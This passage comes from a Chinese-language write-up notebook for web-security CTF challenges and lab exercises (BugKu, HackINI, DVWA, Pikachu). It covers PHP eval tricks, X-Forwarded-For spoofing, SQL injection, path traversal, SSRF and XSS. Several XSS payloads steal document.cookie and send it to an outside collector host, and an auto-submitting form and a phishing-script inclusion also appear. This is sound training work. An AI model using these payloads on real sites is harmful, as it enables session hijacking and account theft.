<code>0e462097431906509019562988736854</code></p></div><div style="display:contents" dir="auto"><p id="44e8db55-6aee-8394-be5e-8166b63671a5" class="">构造：<code>?kkeyey1=QNKCDZO&amp;kkeyey2=240610708</code></p></div><div style="display:contents" dir="ltr"><figure id="d178db55-6aee-832e-9d36-0168caa335ed" class="image"><a href="WebWriteUp/Snipaste_2025-07-31_21-08-21.png"><img style="width:681.93359375px" src="WebWriteUp/Snipaste_2025-07-31_21-08-21.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="7f48db55-6aee-8220-8b96-81c9a27e4521" class="toggle"><li><details open=""><summary>[BugKu]-变量1（php代码分析）</summary><div style="display:contents" dir="auto"><pre id="63e8db55-6aee-8276-bdb3-8130f643e9bb" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">&lt;?php  
+// 关闭错误报告（避免泄露敏感信息）
+error_reporting(0);
+// 包含flag1.php文件（通常存放关键信息如flag）
+include &quot;flag1.php&quot;;
+// 高亮显示当前文件的代码（方便查看源码）
+highlight_file(__file__);
+// 检查是否通过GET请求传递了args参数
+if(isset($_GET[&#x27;args&#x27;])){
+    // 获取GET参数args的值
+    $args = $_GET[&#x27;args&#x27;];
+    // 正则匹配验证args：必须由字母、数字或下划线组成（^\w+$ 表示匹配整个字符串为单词字符）
+    // \w 等价于 [a-zA-Z0-9_]，+ 表示至少一个字符
+    if(!preg_match(&quot;/^\w+$/&quot;,$args)){
+        die(&quot;args error!&quot;); // 不满足正则则则输出错误并终止
+    }
+    // 执行代码：将$$args作为变量传入var_dump()并执行
+    eval(&quot;var_dump($$args);&quot;);
+}
+?&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="6bf8db55-6aee-823a-8682-010b97c0f0e7" class="">函数解释：</p></div><div style="display:contents" dir="auto"><pre id="4728db55-6aee-8269-a50d-016c64061097" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">var_dump() ： 详细的显示变量内容
+-----------
+eval() ： 能够将字符串作为 PHP 代码执行。
+$code = &#x27;echo &quot;Hello, eval()!&quot;;&#x27;;
+eval($code); // 输出：Hello, eval()!
+若 eval() 的参数 $code 包含用户可控的内容（如 URL 参数、表单输入），攻击者可注入恶意代码，完全控制服务器。</code></pre></div><div style="display:contents" dir="auto"><p id="a558db55-6aee-826a-9119-81651213043d" class="">这里利用 PHP 的<strong>超全局变量</strong>（如<code>$GLOBALS</code>），因为：</p></div><div style="display:contents" dir="auto"><p id="3378db55-6aee-82ad-a1bd-0130ce0958aa" class=""><code>$GLOBALS</code>是一个包含所有全局变量的数组，包括<code>flag1.php</code>中定义的变量（如<code>$flag</code>）。</p></div><div style="display:contents" dir="auto"><p id="9bc8db55-6aee-83f0-ac7a-0136378c9284" class="">变量名<code>GLOBALS</code>仅包含字母和下划线，满足<code>/^\w+$/</code>的正则要求。</p></div><div style="display:contents" dir="ltr"><figure id="a358db55-6aee-821d-a735-81fd08db8b92" class="image"><a href="WebWriteUp/Snipaste_2025-07-31_23-19-01.png"><img style="width:681.9856567382812px" src="WebWriteUp/Snipaste_2025-07-31_23-19-01.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="5b68db55-6aee-8235-a96a-81173ea1a6db" class="toggle"><li><details open=""><summary>[BugKu]-本地管理员（构造X-Forwarded-For）</summary><div style="display:contents" dir="auto"><p id="7048db55-6aee-834e-80be-01036a4bb8de" class="">1、F12查看源码，发现一串base64加密字符串，解密后为test123</p></div><div style="display:contents" dir="auto"><p id="4688db55-6aee-8246-91d8-818df39a9528" class="">用户名为admin，密码为test123尝试登录，发现提示不是本地。</p></div><div style="display:contents" dir="auto"><hr id="2dd8db55-6aee-8377-94f5-81a28a278fd5"/></div><div style="display:contents" dir="auto"><p id="0948db55-6aee-8216-ad6b-811dee6dec8e" class="">因为某些网站会优先信任X-Forwarded-For头来获取客户端真实ip，导致我们可以直接伪造X-Forwarded-For:127.0.0.1让其识别为本地登录来绕过。</p></div><div style="display:contents" dir="auto"><p id="15a8db55-6aee-82c2-a1dc-018a53bdda24" class="">绕过方法有很多：</p></div><div style="display:contents" dir="auto"><p id="8228db55-6aee-82d3-b9f6-013dccc9581a" class="">1、BurpSuite拦截添加Forwarded-For:127.0.0.1，</p></div><div style="display:contents" dir="auto"><p id="c3e8db55-6aee-8365-b48e-012b90b3b6e0" class="">2、编写python脚本，获取返回内容</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" integrity="sha512-AKaNmg8COK0zEbjTdMHJAPJ0z6VeNqvRvH4/d5M4sHJbQQUToMBtodq4HaV4fa+WV2UTfoperElm66c9/8cKmQ==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="4b98db55-6aee-83b0-8e4f-015ab705931e" class="code code-wrap"><code class="language-python" style="white-space:pre-wrap;word-break:break-all">import requests
+url = &quot;https://example.com&quot;
+headers = {
+    &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;  # 伪造的IP
+}
+response = requests.get(url, headers=headers)
+print(response.text)</code></pre></div><div style="display:contents" dir="auto"><p id="2428db55-6aee-8228-bf5d-81e41578f28f" class="">3、使用curl命令</p></div><div style="display:contents" dir="auto"><pre id="4718db55-6aee-8339-8f55-0189c4d311e9" class="code code-wrap"><code class="language-python" style="white-space:pre-wrap;word-break:break-all">Windows
+curl -s -H &quot;X-Forwarded-For: 1.2.3.4&quot; https://example.com | findstr &quot;target_string&quot;
+
+Linux/mac
+# 发送请求并查找包含 &quot;target_string&quot; 的内容
+curl -s -H &quot;X-Forwarded-For: 1.2.3.4&quot; https://example.com | grep &quot;target_string&quot;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="9558db55-6aee-8236-8cdf-81d199d1e04e" class="toggle"><li><details open=""><summary>[BugKu]-构造非法请求（逆向签名规则，构造非法请求）</summary><div style="display:contents" dir="auto"><p id="41f8db55-6aee-82f1-baf7-819bbcbc42ef" class="">1、利用bp抓包，发现每次游戏结束时候，会向服务器发送请求，其中包含 score=分数 和sign=zM+(Base64.encode(分数)).</p></div><div style="display:contents" dir="ltr"><figure id="51e8db55-6aee-824e-87e9-0186f1a4b366" class="image"><a href="WebWriteUp/Snipaste_2025-08-07_22-47-34.png"><img style="width:681.9791259765625px" src="WebWriteUp/Snipaste_2025-08-07_22-47-34.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="b6e8db55-6aee-8240-84a1-81935326c7fa" class="">2、构造非法请求，将足够大的分数和对应sign值发送给服务器，发现失败了，</p></div><div style="display:contents" dir="auto"><p id="5eb8db55-6aee-83ac-bcbb-016bf1f8f4b8" class="">仔细观察发现显示结果的页面在score.php上</p></div><div style="display:contents" dir="ltr"><figure id="5988db55-6aee-826a-99aa-812779f281b7" class="image"><a href="WebWriteUp/Snipaste_2025-08-07_22-50-53.png"><img style="width:681.97265625px" src="WebWriteUp/Snipaste_2025-08-07_22-50-53.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="e238db55-6aee-8356-87d8-0119359f1591" class="">因此构造在score.php上即可</p></div><div style="display:contents" dir="auto"><p id="d318db55-6aee-83a8-8bfc-0116cc427bd2" class="">/score.php?score=999999&amp;sign=zMOtk5OTk5==</p></div><div style="display:contents" dir="auto"><p id="a218db55-6aee-83cd-b15d-810ef7449283" class="">得到flag</p></div><div style="display:contents" dir="ltr"><figure id="1618db55-6aee-825a-83db-814e9cf99f2c" class="image"><a href="WebWriteUp/Snipaste_2025-08-07_22-46-32.png"><img style="width:822px" src="WebWriteUp/Snipaste_2025-08-07_22-46-32.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="9f78db55-6aee-83ae-8e99-81b2f9afab64" class="toggle"><li><details open=""><summary>[BugKu]-源代码（RUL编码）</summary><div style="display:contents" dir="auto"><p id="04b8db55-6aee-839d-9daf-0169f549d445" class="">F12查看源代码， 把代码丢到豆包中得到</p></div><div style="display:contents" dir="auto"><p id="7ba8db55-6aee-831e-a3f0-816147c04994" class="">67d709b2b54aa2aa648cf6e87a7114f1</p></div><div style="display:contents" dir="auto"><p id="b238db55-6aee-82c0-a9e9-81c38e458f05" class="">输入即可</p></div><div style="display:contents" dir="auto"><p id="9a38db55-6aee-82d7-8968-013826672bd6" class="">flag{923c01cc80d293ac9deb9d3ed006b066}</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="b828db55-6aee-823f-a2fb-81ae05c38610" class="toggle"><li><details open=""><summary>[BugKu]-网站被黑（构造X-Forwarded-For，bp爆破）</summary><div style="display:contents" dir="auto"><p id="80c8db55-6aee-8392-9ffd-0150fe32c407" class="">1、dirsearch扫描一下目录，发现了shell.php访问发现需要密码，根据提示，发现需要本地权限，构造X-Forwarded-For:127.0.0.1,并且在bp中爆破</p></div><div style="display:contents" dir="ltr"><figure id="89d8db55-6aee-8215-82ed-8151bc2c10ee" class="image"><a href="WebWriteUp/Snipaste_2025-08-09_23-38-28.png"><img style="width:681.9921875px" src="WebWriteUp/Snipaste_2025-08-09_23-38-28.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="8828db55-6aee-8232-b96f-816543769ff2" class="">2、先输入密码拦截一下，添加到右键拦截到的页面，添加X-Forwarded-For:127.0.0.1，右键发送到intruder，之后操作如下</p></div><div style="display:contents" dir="ltr"><figure id="98f8db55-6aee-83a1-b73d-01abff7bd5fb" class="image"><a href="WebWriteUp/051f79c912b1b130fc9b01f80c34acd3.png"><img style="width:681.9856567382812px" src="WebWriteUp/051f79c912b1b130fc9b01f80c34acd3.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="f1e8db55-6aee-8288-8583-81f0d0cb8a38" class="">最后破解的密码是hack，输入得到flag</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="a5b8db55-6aee-8378-9e49-81c3d300c9c9" class="toggle"><li><details open=""><summary>[HackINI-2021]-my-first-sqli（简单sql注入）</summary><div style="display:contents" dir="auto"><p id="a888db55-6aee-8260-910b-0153a5e3e1a3" class="">用户名和密码都输入1&#x27; or 1=1 --+</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="0038db55-6aee-825b-82a4-0148c1e077aa" class="toggle"><li><details open=""><summary>[HackINI-2021]-post-the-get（改源码）</summary><div style="display:contents" dir="auto"><p id="04a8db55-6aee-82fc-8016-81dcb851b156" class="">method改为post，删除disabled，点击post即可</p></div><div style="display:contents" dir="ltr"><figure id="1268db55-6aee-82c8-8c37-01029ed4ed92" class="image"><a href="WebWriteUp/Snipaste_2025-08-12_21-43-03.png"><img style="width:833.4765625px" src="WebWriteUp/Snipaste_2025-08-12_21-43-03.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="ffe8db55-6aee-822c-bec2-81aaa454fde8" class="toggle"><li><details open=""><summary>[HackINI-2021]-sqli-0x1（sql注入伪造用户数据）</summary><div style="display:contents" dir="auto"><pre id="0af8db55-6aee-828d-baab-812eb1e19a76" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+error_reporting(0);
+error_log(0);
+
+require_once(&quot;flag.php&quot;);
+
+function is_trying_to_hak_me($str)
+{   
+    $blacklist = [&quot;&#x27; &quot;, &quot; &#x27;&quot;, &#x27;&quot;&#x27;, &quot;`&quot;, &quot; `&quot;, &quot;` &quot;, &quot;&gt;&quot;, &quot;&lt;&quot;];
+    if (strpos($str, &quot;&#x27;&quot;) !== false) {
+        if (!preg_match(&quot;/[0-9a-zA-Z]&#x27;[0-9a-zA-Z]/&quot;, $str)) { // 不过滤&#x27;两端是数字与字母的情况
+            return true; // 对于这种用户名可以构造admin&#x27;OR&#x27;1&#x27;=&#x27;1（题外话）
+        }
+    }
+    foreach ($blacklist as $token) {
+        if (strpos($str, $token) !== false) return true;
+    }
+    return false;
+}
+
+if (isset($_GET[&quot;pls_help&quot;])) {
+    highlight_file(__FILE__);
+    exit;
+}
+	  // 接收并验证用户输入非空
+if (isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;]) &amp;&amp; (!empty($_POST[&quot;user&quot;])) &amp;&amp; (!empty($_POST[&quot;pass&quot;]))) {
+    $user = $_POST[&quot;user&quot;];
+    $pass = $_POST[&quot;pass&quot;];
+    // 过滤用户名，恶意则终止
+    if (is_trying_to_hak_me($user)) {
+        die(&quot;why u bully me&quot;);
+    }
+		// 链接数据库，执行查询
+    $db = new SQLite3(&quot;/var/db.sqlite&quot;);
+    $result = $db-&gt;query(&quot;SELECT * FROM users WHERE username=&#x27;$user&#x27;&quot;);
+    if ($result === false) die(&quot;pls dont break me&quot;);
+    else $result = $result-&gt;fetchArray(); // 获得查询结果
+		
+		// 验证密码
+    if ($result) {
+		    // 拆分数据库中存储的密码（格式：哈希值$盐值）
+        $split = explode(&#x27;$&#x27;, $result[&quot;password&quot;]);
+        $password_hash = $split[0]; // 密码的哈希值
+        $salt = $split[1] // 盐值
+        // 验证：用户输入的(密码+盐值)的哈希是否等于数据库中存储的哈希值
+        if ($password_hash === hash(&quot;sha256&quot;, $pass.$salt)) $logged_in = true;
+        else $err = &quot;Wrong password&quot;;
+    }
+    else $err = &quot;No such user&quot;;
+}
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hack.INI 9th - SQLi&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;?php if (isset($logged_in) &amp;&amp; $logged_in): ?&gt;
+    &lt;p&gt;Welcome back admin! Have a flag: &lt;?=htmlspecialchars($flag);?&gt;&lt;p&gt;
+    &lt;?php else: ?&gt;
+    &lt;form method=&quot;post&quot;&gt;
+        &lt;input type=&quot;text&quot; placeholder=&quot;Username&quot; name=&quot;user&quot; required&gt;
+        &lt;input type=&quot;password&quot; placeholder=&quot;Password&quot; name=&quot;pass&quot; required&gt;
+        &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+        &lt;br&gt;&lt;br&gt;
+        &lt;?php if (isset($err)) echo $err; ?&gt;
+    &lt;/form&gt;
+    &lt;?php endif; ?&gt;
+    &lt;!-- &lt;a href=&quot;/?pls_help&quot;&gt;get some help&lt;/a&gt; --&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="f638db55-6aee-8246-b94a-8133c861e550" class="">username：1&#x27;union/<strong>/select/</strong>/1,&#x27;4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8$1</p></div><div style="display:contents" dir="auto"><p id="5e58db55-6aee-82c4-8a8a-013c204b328a" class="">(// 替代空格)</p></div><div style="display:contents" dir="auto"><p id="26b8db55-6aee-837d-8e05-81058c779fc4" class="">password：</p></div><div style="display:contents" dir="auto"><p id="0e88db55-6aee-83aa-af6e-8109c9e4d117" class="">1</p></div><div style="display:contents" dir="auto"><p id="35d8db55-6aee-82b2-b760-81a3aa5b2ff5" class="">通过用户名，使用union，伪造了后面1,&#x27;4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8$1</p></div><div style="display:contents" dir="auto"><p id="fdb8db55-6aee-8303-b50a-0134cc548620" class="">的用户记录，这样用户数据库返回的就是伪造的内容，返回的$result就是伪造的，密码自然就是伪造的内容</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="c2f8db55-6aee-82da-a856-819e69398894" class="toggle"><li><details open=""><summary>[HackINI-2022]-baby-Ifi（路径构造）</summary><div style="display:contents" dir="auto"><p id="b7d8db55-6aee-835c-9998-813b1ebe8438" class="">根据提示</p></div><div style="display:contents" dir="ltr"><figure id="40d8db55-6aee-82dc-bd12-81eed3e67b00" class="image"><a href="WebWriteUp/Snipaste_2025-08-14_21-27-01.png"><img style="width:833.4830322265625px" src="WebWriteUp/Snipaste_2025-08-14_21-27-01.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="cb98db55-6aee-83a7-8a48-011523137769" class="toggle"><li><details open=""><summary>[HackINI-2022]-baby-Ifi2（路径构造）</summary><div style="display:contents" dir="auto"><p id="6188db55-6aee-82aa-99a5-0135efdee6ff" class="">根据提示 存在一个“languages”目录，</p></div><div style="display:contents" dir="auto"><p id="9d08db55-6aee-83a6-ac1d-0100955799a8" class="">由于存在 languages 目录是确定的；构造payload</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-jsx.min.js" integrity="sha512-m3JYEI6gx5fh9jF10FjGoMzVKcV2N6nchcDcqPCdI1L3R2WQV7br2XVNR8iTLb2daOMRl3zldbcfT40xU2ntVw==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="5678db55-6aee-82c8-8ee9-01e21eb6efa3" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">http://82.157.146.43:17219/?language=./languages/etc/passwd</code></pre></div><div style="display:contents" dir="auto"><p id="58a8db55-6aee-83c3-9beb-018a8d790c77" class="">返回了提示信息 Illegal path specified!</p></div><div style="display:contents" dir="auto"><p id="de48db55-6aee-826a-bd1e-0156b12998f6" class="">返回路径不合法， 通过.  和  ../修改路径</p></div><div style="display:contents" dir="ltr"><figure id="b6c8db55-6aee-83ed-96c1-8103140eda2a" class="image"><a href="WebWriteUp/Snipaste_2025-08-14_21-31-15.png"><img style="width:833.4830322265625px" src="WebWriteUp/Snipaste_2025-08-14_21-31-15.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="55a8db55-6aee-82ec-b849-8150804a922f" class="">为什么可以通过.  和  ../修改路径？</p></div><div style="display:contents" dir="auto"><p id="d548db55-6aee-829e-b34d-017d919823d7" class="">当路径中 <code><strong>..</strong></code> 的数量超过可回溯的目录层级时，路径会尝试访问 <strong>根目录之上</strong> 的位置（如 Linux 的 <code><strong>/</strong></code> 或 Windows 的 <code><strong>C:\</strong></code>），这是文件系统不允许的。</p></div><div style="display:contents" dir="auto"><p id="df08db55-6aee-837b-834f-0199e7099f4d" class="">大多数操作系统会忽略多余的 <code><strong>..</strong></code> ，最终停留在根目录（如返回 <code><strong>/etc</strong></code> 或 <code><strong>C:\Windows</strong></code>），但某些严格校验的API会直接报错。</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="8188db55-6aee-83d8-9fe7-0158aa3cfc7f" class="toggle"><li><details open=""><summary>[HackINI-2022]-Ifi（构造路径，双写绕过）</summary><div style="display:contents" dir="auto"><p id="4be8db55-6aee-83e9-a913-01e48b02cacb" class="">题目屏蔽了<code>../</code> 那就替换为 <code>..././</code> 中间的<code>../</code>被替换后其余字符仍然是 <code>../</code></p></div><div style="display:contents" dir="ltr"><figure id="d9e8db55-6aee-8231-bb7c-0122fc08045e" class="image"><a href="WebWriteUp/Snipaste_2025-08-14_21-47-19.png"><img style="width:833.4765625px" src="WebWriteUp/Snipaste_2025-08-14_21-47-19.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="1518db55-6aee-8336-a13d-81a568163081" class="toggle"><li><details open=""><summary>[HackINI-2022]-nextGen1（ssrf，file协议）</summary><div style="display:contents" dir="auto"><p id="92a8db55-6aee-83b7-811d-01f8d859220d" class="">F12打开看一下</p></div><div style="display:contents" dir="auto"><p id="43d8db55-6aee-8352-bbda-811d26faca9a" class="">有一个js文件，打开看一下</p></div><div style="display:contents" dir="auto"><p id="ad48db55-6aee-830a-8c47-81e1f266653f" class="">得到的信息有：post，/request请求，</p></div><div style="display:contents" dir="auto"><p id="7548db55-6aee-83da-a101-0157f7c0a8f4" class="">Content-Type属性</p></div><div style="display:contents" dir="auto"><p id="8ae8db55-6aee-8299-be06-819096f17ecb" class="">service是通过this指针找文件的</p></div><div style="display:contents" dir="auto"><p id="aaa8db55-6aee-825d-b5df-81a27e1dc88e" class="">可以判断出可以试试ssrf</p></div><div style="display:contents" dir="auto"><p id="ce68db55-6aee-83c2-ba4b-81a3d3b05351" class="">首先是file协议</p></div><div style="display:contents" dir="ltr"><figure id="c0f8db55-6aee-8296-acda-81eea1980591" class="image"><a href="WebWriteUp/Snipaste_2025-08-14_22-05-13.png"><img style="width:591.9856567382812px" src="WebWriteUp/Snipaste_2025-08-14_22-05-13.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="3fd8db55-6aee-8399-8ac5-01f17966589b" class="image"><a href="WebWriteUp/Snipaste_2025-08-14_22-05-22.png"><img style="width:833.4765625px" src="WebWriteUp/Snipaste_2025-08-14_22-05-22.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="af58db55-6aee-8223-9744-016c4d88c3f9" class=""><code>file://127.0.0.1/flag.txt (file:////flag.txt)</code> </p></div><div style="display:contents" dir="ltr"><figure id="0818db55-6aee-8213-a67b-81272f3102fb" class="image"><a href="WebWriteUp/Snipaste_2025-08-14_22-01-09.png"><img style="width:833.4830322265625px" src="WebWriteUp/Snipaste_2025-08-14_22-01-09.png"/></a></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="83e8db55-6aee-823f-b992-01a59a08612b" class="toggle"><li><details open=""><summary>[HackINI-2022]-challenge-creator</summary></details></li></ul></div><div style="display:contents" dir="auto"><ul id="27a8db55-6aee-8375-9eca-0107e87228b8" class="toggle"><li><details open=""><summary>DVWA</summary><div style="display:contents" dir="auto"><ul id="a128db55-6aee-8368-ad2f-81d553220576" class="toggle"><li><details open=""><summary>XSS（DOM）</summary><div style="display:contents" dir="auto"><p id="9218db55-6aee-836e-b3d0-8120e0d62bc7" class="">1、Low-不存在任何防御级别：直接插入xss即可</p></div><div style="display:contents" dir="auto"><pre id="4088db55-6aee-8387-9829-01720f733fe4" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">?default=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="1918db55-6aee-8203-9e51-8185a617eaf0" class="">2、Medium-存在&lt;script&gt;标签过滤，但可以通过闭合其他标签或使用不同的大小写来绕过这些过滤措施。</p></div><div style="display:contents" dir="auto"><p id="fec8db55-6aee-82fb-9d51-0170d8d456c4" class="">同时单引号会用被unicode编码，导致Javascript无法执行</p></div><div style="display:contents" dir="auto"><pre id="4448db55-6aee-832e-a042-8181da530392" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">?default=abssc&gt;&lt;/option&gt;&lt;/select&gt;&lt;iframe onload=alert(/xss/)&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="d5f8db55-6aee-8363-9269-819a176dc239" class=""><code>&lt;img src=x onerror=&#x27;alert(/xss/)&#x27;&gt;</code> 无法使用可能是因为对onerror事件进行了过滤移除或转义，</p></div><div style="display:contents" dir="auto"><p id="5188db55-6aee-820c-a95e-81eea5cee6a3" class="">或者验证src必须是一个有效的URL，否则会将整个标签移除。</p></div><div style="display:contents" dir="auto"><p id="9e88db55-6aee-83f8-bdcc-81820a425c6c" class="">或者也可能将单引号进行了编码（’→&amp;#39）导致Javascript代码无法正常执行。</p></div><div style="display:contents" dir="auto"><p id="f7c8db55-6aee-8271-b47b-01ac0bdd5e21" class="">或者存在CSP</p></div><div style="display:contents" dir="auto"><p id="2028db55-6aee-828a-916e-01429e01dea6" class="">3、High-中DVMA通过白名单过滤，只允许特定的值通过，但仍然可以通过利用URL中的#符号特性来绕过白名单。</p></div><div style="display:contents" dir="auto"><pre id="9fd8db55-6aee-8385-b293-815b79669ab4" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">?default=dsasss#&lt;/option&gt;&lt;/select&gt;&lt;iframe onload=alert(/xss/)&gt;&lt;/option&gt;
+// 最后的&lt;/option&gt;是多余的，用来迷惑过滤机制，可以去掉</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="e368db55-6aee-82b1-8406-0138605e8903" class="toggle"><li><details open=""><summary>XSS（Reflected）</summary><div style="display:contents" dir="auto"><p id="2ff8db55-6aee-8330-967f-8108bb6c9725" class="">1、Low-没有任何安全设置，直接注入&lt;script&gt;代码即可：</p></div><div style="display:contents" dir="auto"><pre id="4598db55-6aee-82f6-af99-81af7ad52414" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">?name=&lt;script&gt;alert(/xss/)&lt;/script&gt; //弹窗注入
+?name==&lt;img src=x onerror=alert(document.cookie)&gt; // 获取cookie</code></pre></div><div style="display:contents" dir="auto"><p id="3cf8db55-6aee-8226-8d18-81a02e32c5c0" class="">2、Medium-DVWA会过滤调&lt;script&gt;标签，但可以通过大小写混淆，双写绕过实现注入：</p></div><div style="display:contents" dir="auto"><p id="94b8db55-6aee-8315-af0b-012d15637ec7" class="">也可以使用其他标签的报错事件进行xss：</p></div><div style="display:contents" dir="auto"><pre id="9878db55-6aee-83d3-8f05-01cedb0db46e" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">?name=&lt;ScRipt&gt;alert(/xss/)&lt;/ScrIpt&gt; // 实测没用 
+?name=&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt; // 实测有效
+?name=&lt;img src=x onerror=alert(/xss/)&gt; // 图片onerror事件注入
+?name=&lt;img src=x onerror=alert(document.cookie)&gt; // 获取cookie</code></pre></div><div style="display:contents" dir="auto"><p id="d5f8db55-6aee-83b1-8d23-01d694fc7b5b" class="">3、High-过滤了&lt;script&gt;及其变体，但是可以使用HTML标签，如&lt;img&gt;:</p></div><div style="display:contents" dir="auto"><pre id="a628db55-6aee-8308-8dd7-819d93aa42f9" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">&lt;img src=x onerror=document.body.appendChild(document.createElement(&#x27;img&#x27;)).setAttribute(&#x27;src&#x27;, &#x27;192.168.238.50:8080/?=&#x27;+document.cookie);&gt;
+// 这将在图片加载失败时执行JavaScript代码，将cookie发送到攻击者的服务器。
+?name=&lt;img src=x onerror=alert(document.cookie)&gt; // 弹框获取cookie // 或者cosole.log()在控制台</code></pre></div></details></li></ul></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="d1d8db55-6aee-82fa-bd7f-01af61ca0e41" class="toggle"><li><details open=""><summary>Pikachu</summary><div style="display:contents" dir="auto"><ul id="4708db55-6aee-8397-ac42-013002e44fb5" class="toggle"><li><details open=""><summary>XSS（Reflected）（get）</summary><div style="display:contents" dir="auto"><pre id="f788db55-6aee-834e-9681-017d7e0b4e99" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"> daaor 1=1 --+ # 找到位置
+&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; # 成功
+&lt;script&gt;console.log(documnet.cookie)&lt;/script&gt;
+# PHPSESSID=9o63lq6crmfoabulc3m048shq1
+kobe&lt;script&gt;location.href=&quot;http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="c128db55-6aee-83fc-a8bb-017ac983a13d" class="toggle"><li><details open=""><summary>XSS（Reflected）（post）</summary><div style="display:contents" dir="auto"><pre id="fc58db55-6aee-8398-8551-01805c624ee2" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">post 请求参数在URL中不会显示，但在第三方拦截软件中会显示。
+需要构造恶意表单或脚本
+kobe&lt;script&gt;location.href=&quot;http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></pre></div><div style="display:contents" dir="auto"><pre id="a578db55-6aee-827c-9693-01c3c9ec4ffc" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">该恶意脚本放在：.../www/pikachu/pkxss/xcookie/post.html
+&lt;html&gt;
+&lt;head&gt;
+&lt;script&gt;
+window.onload = function() {
+document.getElementById(&quot;postsubmit&quot;).click();
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;&gt;
+    &lt;input id=&quot;xssr_in&quot; type=&quot;text&quot; style=&quot;display:none&quot; name=&quot;message&quot; value=
+    &quot;&lt;script&gt;
+        document.location = &#x27;http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;
+    &lt;/script&gt;&quot;
+    /&gt;
+    &lt;div style=&quot;display:none;&quot;&gt;
+        &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+    &lt;/div&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="9bc8db55-6aee-821c-905b-817fc3f490a8" class="toggle"><li><details open=""><summary>XSS（Stored）</summary><div style="display:contents" dir="auto"><pre id="e6f8db55-6aee-82d4-9612-01d0ee1901b0" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; // 有效，xss可以直接注入
+&lt;script src=&quot;http://127.0.0.1/Pikachu/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt; // 跳转到钓鱼网站，会显示输入用户名密码：
